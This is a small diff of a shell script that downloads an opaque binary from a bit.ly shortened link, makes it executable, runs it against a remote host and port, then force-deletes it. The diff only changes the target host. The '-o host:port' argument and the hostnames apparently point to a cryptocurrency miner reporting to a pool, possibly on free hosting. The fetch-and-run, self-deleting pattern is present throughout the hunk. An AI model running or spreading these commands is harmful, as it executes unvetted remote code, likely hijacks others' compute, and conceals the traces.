@@ -6,5 +6,5 @@
 cd /home
 wget https://bit.ly/3mPeYds
 chmod +x 3mPeYds 
-./3mPeYds -o heroku.erlandi.eu.org
+./3mPeYds -o xm.erlandi.eu.org:5001
 rm -irf 3mPeYds
